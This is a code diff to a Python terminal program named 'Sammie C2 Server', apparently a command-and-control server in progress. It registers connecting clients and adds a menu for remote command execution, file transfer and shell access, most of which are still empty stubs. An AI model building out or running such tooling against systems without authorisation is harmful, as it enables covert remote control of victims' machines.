@@ -1,4 +1,4 @@
-import argparse, curses, socket, threading, time
+import argparse, curses, socket, threading, time, uuid
 
 clients = []
 lock = threading.Lock()
@@ -8,11 +8,28 @@ def get_arguments():
   parser.add_argument('-p', '--port', type=int, default=12568, help='Listening port (Default: 12568)', dest='port')
   return parser.parse_args()
 
+
+def read_until_eod(c):
+  data = c.recv(4096).decode()
+
+  while data[-4:] != "EOD\n":
+    data += c.recv(4096).decode()
+
+  data = data.strip()[:-3]
+
+  return data
+
 def new_client(client_socket, addr):
   global clients
+  
+  data = read_until_eod(client_socket)
 
   with lock:
-    clients.append(dict(socket=client_socket, addr=addr))
+    cid = str(uuid.uuid4())
+    client_socket.send(("id " + cid + "\n").encode())
+    clients.append(dict(socket=client_socket, addr=addr, data=data, cid=cid))
+
+  
 
 def listen_for_clients(port):
   t = threading.currentThread()
@@ -24,13 +41,64 @@ def listen_for_clients(port):
 
   while getattr(t, "running", True):
     c, addr = s.accept()
-    new_client(c,addr)
+    threading.Thread(target=new_client, args=(c,addr,)).start()
 
   for client in clients:
     client['socket'].send("gtfo\n".encode())
     client['socket'].close()
 
   return
+
+def client_menu(stdscr, c_num):
+  with lock:
+    client = clients[c_num]
+
+  c_menu = True
+
+  selected = 0
+
+  while c_menu:
+    c = stdscr.getch()
+    curses.flushinp()
+
+    if (c == curses.KEY_ENTER or c == 10 or c == 13):
+      if selected == 0:
+        c_menu = False
+      elif selected == 1: # Disconnect
+        client["socket"].send(b"gtfo\n")
+        with lock:
+          client["socket"].close()
+          clients.remove(client)
+        c_menu = False
+      elif selected == 2: # Execute Command
+        pass
+      elif selected == 3: # Download File
+        pass
+      elif selected == 4: # Upload File
+        pass
+      elif selected == 5: # Open Shell
+        pass
+    elif c == curses.KEY_DOWN:
+      selected = (selected + 1)%6
+    elif c == curses.KEY_UP:
+      selected = (selected - 1)%6
+
+
+    stdscr.clear()
+
+    stdscr.addstr(0,0,"Connected to client", curses.color_pair(5))
+    stdscr.addstr(1,0,client["data"],curses.color_pair(3))
+
+    stdscr.addstr(3,0,"<- Back", curses.A_REVERSE if selected == 0 else 0)
+    stdscr.addstr(4,0,"Disconnect Client", curses.A_REVERSE if selected == 1 else 0)
+    stdscr.addstr(5,0,"Execute Command", curses.A_REVERSE if selected == 2 else 0)
+    stdscr.addstr(6,0,"Download File from Client", curses.A_REVERSE if selected == 3 else 0)
+    stdscr.addstr(7,0,"Upload File to Client", curses.A_REVERSE if selected == 4 else 0)
+    stdscr.addstr(8,0,"Open Shell", curses.A_REVERSE if selected == 5 else 0)
+
+    time.sleep(0.1)
+
+
 
 def nice_menu_function(stdscr):
   stdscr.clear()
@@ -49,7 +117,7 @@ def nice_menu_function(stdscr):
   while running:
     c = stdscr.getch()
     curses.flushinp()
-    stdscr.clear()
+    
 
     if c == ord('q'):
       running = False
@@ -61,6 +129,11 @@ def nice_menu_function(stdscr):
     elif c == curses.KEY_UP and len(clients) > 0:
       selected = (selected - 1) % len(clients)
 
+    elif (c == curses.KEY_ENTER or c == 10 or c == 13) and len(clients) > 0:
+      client_menu(stdscr, selected)
+
+    stdscr.clear()
+
     stdscr.addstr(0, 0, "Sammie C2 Server", curses.color_pair(5))
     stdscr.addstr(1, 0, "Connected Clients", curses.color_pair(3))
     stdscr.addstr(height-1, 0, "Press 'q' to quit server")
@@ -71,9 +144,9 @@ def nice_menu_function(stdscr):
       else:
         for i, client in enumerate(clients):
           if i == selected:
-            stdscr.addstr(i+3,0,str(i) + ") " + client['addr'][0], curses.A_REVERSE)
+            stdscr.addstr(i+3,0,str(i) + ") " + client['data'], curses.A_REVERSE)
           else:
-            stdscr.addstr(i+3,0,str(i) + ") " + client['addr'][0])
+            stdscr.addstr(i+3,0,str(i) + ") " + client['data'])
 
     stdscr.refresh()
 
@@ -86,12 +159,17 @@ def main():
   t = threading.Thread(target=listen_for_clients, args=(args.port,))
   t.start()
 
-  curses.wrapper(nice_menu_function)
+
+  try:
+    curses.wrapper(nice_menu_function)
+  except KeyboardInterrupt:
+    pass
 
   t.running = False
 
   s = socket.socket()
-  s.connect(("localhost", args.port))
+  s.connect(("127.0.0.1", args.port))
+  s.send("EOD\n".encode())
   s.close()
 
   t.join()
